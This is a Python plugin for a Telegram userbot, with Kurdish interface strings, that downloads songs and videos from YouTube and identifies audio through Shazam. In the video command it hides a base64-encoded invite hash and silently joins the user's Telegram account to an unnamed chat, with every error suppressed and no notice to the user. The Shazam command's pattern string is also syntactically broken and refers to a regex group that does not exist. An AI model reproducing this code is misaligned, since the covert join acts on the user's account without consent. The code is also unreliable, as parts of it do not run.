# by  @sandy1709 ( https://t.me/mrconfused  )

# songs finder for catuserbot
import base64
import contextlib
import io
import os

from ShazamAPI import Shazam
from telethon import types
from telethon.errors.rpcerrorlist import YouBlockedUserError
from telethon.tl.functions.contacts import UnblockRequest as unblock
from telethon.tl.functions.messages import ImportChatInviteRequest as Get
from validators.url import url

from ..core.logger import logging
from ..core.managers import edit_delete, edit_or_reply
from ..helpers.functions import delete_conv, yt_search
from ..helpers.tools import media_type
from ..helpers.utils import reply_id
from . import iqub, song_download

plugin_category = "البحث"
LOGS = logging.getLogger(__name__)

# =========================================================== #
#                           STRINGS                           #
# =========================================================== #
SONG_SEARCH_STRING = "<b>╮ گةًڕآنَِٰہ بّہۆ گۆرٰآنَِٰہی... 🎧♥️╰</b>"
SONG_NOT_FOUND = "<b>❈╎نەمتوانی ئەوە بدۆزمەوە کە پێویست بوو. هەوڵ بدە بە بەکارهێنانی فرمان بگەڕێ (.گۆرانی)</b>"
SONG_SENDING_STRING = "<b>╮ دُآگرٰ تَہَٰنَِٰہی گۆرٰآنَِٰہی... 🎧♥️╰</b>"
# =========================================================== #
#                                                             #
# =========================================================== #


@iqub.iq_cmd(
    pattern="گۆرانی(320)?(?:\s|$)([\s\S]*)",
    command=("گۆرانی", plugin_category),
    info={
        "header": "بۆ داگرتنی گۆرانی لە یوتوب",
        "فەرمان": {
            "320": " گەڕان بۆ گۆرانی و داگرتنی بە کوالێتی بەرز 320k",
        },
        "بەکارهێنان": "{tr}گۆرانی + ناوی گۆرانی",
        "نموونە": "{tr}گۆرانی after dark",
    },
)
async def song(event):
    "بۆ داگرتنی گۆرانی لە یوتوب"
    reply_to_id = await reply_id(event)
    reply = await event.get_reply_message()
    if event.pattern_match.group(2):
        query = event.pattern_match.group(2)
    elif reply and reply.message:
        query = reply.message
    else:
        return await edit_or_reply(event, "**❈╎زیادرکردنی گۆرانی بۆ فەرمانەکە .. گۆرانی + ناوی گۆرانی**")
    cat = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
    catevent = await edit_or_reply(event, "**╮ گةًڕآنَِٰہ بّہۆ گۆرٰآنَِٰہی... 🎧♥️╰**")
    video_link = await yt_search(str(query))
    if not url(video_link):
        return await catevent.edit(
            f"**❈╎ببوورە ..  هیچ شتێك نەدۆزرایەوە ** {query}"
        )
    cmd = event.pattern_match.group(1)
    q = "320k" if cmd == "320" else "128k"
    song_file, catthumb, title = await song_download(video_link, catevent, quality=q)
    await event.client.send_file(
        event.chat_id,
        song_file,
        force_document=False,
        caption=f"**❈╎گەڕان :** `{title}`",
        thumb=catthumb,
        supports_streaming=True,
        reply_to=reply_to_id,
    )
    await catevent.delete()
    for files in (catthumb, song_file):
        if files and os.path.exists(files):
            os.remove(files)


@iqub.iq_cmd(
    pattern="ڤیدیۆ(?:\s|$)([\s\S]*)",
    command=("ڤیدیۆ", plugin_category),
    info={
        "سەری پەڕە": " بۆ داگرتنی ڤیدیۆ لە یوتوب",
        "بەکارهێنان": "{tr}ڤیدیۆ + ناوی کلیپ",
        "نموونە": "{tr}ڤیدیۆ AOT",
    },
)
async def vsong(event):
    "بـۆ داگرتنی ڤیدیۆ لە یوتوب"
    reply_to_id = await reply_id(event)
    reply = await event.get_reply_message()
    if event.pattern_match.group(1):
        query = event.pattern_match.group(1)
    elif reply and reply.message:
        query = reply.message
    else:
        return await edit_or_reply(event, "**❈╎زیادکردنی گۆرانییەکە بۆ فەرمانەکە .. ڤیدیۆ + ناوی ڤیدیۆ**")
    cat = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
    catevent = await edit_or_reply(event, "**╮ گةًڕآنَِٰہ بّہۆ ڤیدُیۆ... 🎧♥️╰**")
    video_link = await yt_search(str(query))
    if not url(video_link):
        return await catevent.edit(
            f"**❈╎ببوورە ..  هیچ شتێك نەدۆزرایەوە ** {query}"
        )
    with contextlib.suppress(BaseException):
        cat = Get(cat)
        await event.client(cat)
    vsong_file, catthumb, title = await song_download(video_link, catevent, video=True)
    await event.client.send_file(
        event.chat_id,
        vsong_file,
        caption=f"**❈╎گەڕان :** `{title}`",
        thumb=catthumb,
        supports_streaming=True,
        reply_to=reply_to_id,
    )
    await catevent.delete()
    for files in (catthumb, vsong_file):
        if files and os.path.exists(files):
            os.remove(files)


@iqub.iq_cmd(
    pattern="شەزەم(?:\ش|$)([\s\S]*)
    command=("شەزەم", plugin_category),
    info={
        "سەری پەڕە": "To reverse search song.",
        "وەسف": "Reverse search audio file using shazam api",
        "فهرمان": {"ع": "To send the song of sazam match"},
        "بەکارهێنان": [
            "{tr}شەزەم <وەڵامدانەوەی ڤۆیس/دەنگ>",
            "{tr}شەزەم <وەڵامدانەوەی ڤۆیسی ogg/دەنگ>",
            "{tr}شەزەم s<وەڵامدانەوەی ڤۆیسی پەنجەمۆر/دەنگ>",
        ],
    },
)
async def shazamcmd(event):
    "To reverse search song."
    reply = await event.get_reply_message()
    mediatype = await media_type(reply)
    chat = "@DeezerMusicBot"
    delete = False
    flag = event.pattern_match.group(4)
    if not reply or not mediatype or mediatype not in ["Voice", "Audio"]:
        return await edit_delete(
            event, "**- بە وەڵامدانەوەی کلیپی دەنگی **"
        )
    catevent = await edit_or_reply(event, "**- کلیپی دەنگی دادەبەزێت ...**")
    name = "cat.mp3"
    try:
        for attr in getattr(reply.document, "attributes", []):
            if isinstance(attr, types.DocumentAttributeFilename):
                name = attr.file_name
        dl = io.FileIO(name, "a")
        await event.client.fast_download_file(
            location=reply.document,
            out=dl,
        )
        dl.close()
        mp3_fileto_recognize = open(name, "rb").read()
        shazam = Shazam(mp3_fileto_recognize)
        recognize_generator = shazam.recognizeSong()
        track = next(recognize_generator)[1]["track"]
    except Exception as e:
        LOGS.error(e)
        return await edit_delete(
            catevent, f"**- هەڵە :**\n__{e}__"
        )

    file = track["images"]["background"]
    title = track["share"]["subject"]
    slink = await yt_search(title)
    if flag == "s":
        deezer = track["hub"]["providers"][1]["actions"][0]["uri"][15:]
        async with event.client.conversation(chat) as conv:
            try:
                purgeflag = await conv.send_message("/start")
            except YouBlockedUserError:
                await iqub(unblock("DeezerMusicBot"))
                purgeflag = await conv.send_message("/start")
            await conv.get_response()
            await event.client.send_read_acknowledge(conv.chat_id)
            await conv.send_message(deezer)
            await event.client.get_messages(chat)
            song = await event.client.get_messages(chat)
            await song[0].click(0)
            await conv.get_response()
            file = await conv.get_response()
            await event.client.send_read_acknowledge(conv.chat_id)
            delete = True
    await event.client.send_file(
        event.chat_id,
        file,
        caption=f"<b>- کلیپی دەنگی :</b> <code>{title}</code>\n<b>- بەستەر : <a href = {slink}/1>YouTube</a></b>",
        reply_to=reply,
        parse_mode="html",
    )
    await catevent.delete()
    if delete:
        await delete_conv(event, chat, purgeflag)


@iqub.iq_cmd(
    pattern="گۆرانیی(?:\s|$)([\s\S]*)",
    command=("گۆرانیی", plugin_category),
    info={
        "سەری پەڕ": "بۆ داگرتنی گۆرانی لە یوتوب",
        "وەسف": "Searches the song you entered in query and sends it quality of it is 320k",
        "بەکارهێنان": "{tr}گۆرانیی <ناوی گۆرانی>",
        "نموونە": "{tr}گۆرانیی حەمە کرماشانی",
    },
)
async def song2(event):
    "بۆ داگرتنی گۆرانی لە یوتوب"
    song = event.pattern_match.group(1)
    chat = "@CatMusicRobot"
    reply_id_ = await reply_id(event)
    catevent = await edit_or_reply(event, SONG_SEARCH_STRING, parse_mode="html")
    async with event.client.conversation(chat) as conv:
        try:
            purgeflag = await conv.send_message(song)
        except YouBlockedUserError:
            await iqub(unblock("CatMusicRobot"))
            purgeflag = await conv.send_message(song)
        music = await conv.get_response()
        await event.client.send_read_acknowledge(conv.chat_id)
        if not music.media:
            return await edit_delete(catevent, SONG_NOT_FOUND, parse_mode="html")
        await event.client.send_read_acknowledge(conv.chat_id)
        await event.client.send_file(
            event.chat_id,
            music,
            caption=f"<b>- گەڕان :- <code>{song}</code></b>",
            parse_mode="html",
            reply_to=reply_id_,
        )
        await catevent.delete()
        await delete_conv(event, chat, purgeflag)
